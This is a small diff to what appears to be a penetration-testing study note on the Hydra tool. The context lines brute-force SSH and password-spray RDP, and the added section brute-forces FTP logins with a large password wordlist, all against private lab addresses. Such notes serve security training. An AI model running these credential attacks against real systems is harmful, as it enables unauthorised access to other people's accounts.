@@ -10,6 +10,12 @@ hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
 hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
 ```
 
+#### Hydra FTP Example (with known usernames)
+
+```bash
+hydra -I -V -f -L users.txt -u -P /opt/SecLists/Passwords/xato-net-10-million-passwords.txt 192.168.179.46 ftp
+```
+
 #### HTTP Examples
 
 As before, we'll specify -l for the user, -P for the wordlist, the target IP without any protocol, and a new http-post-form argument, which accepts three colon-delimited fields.
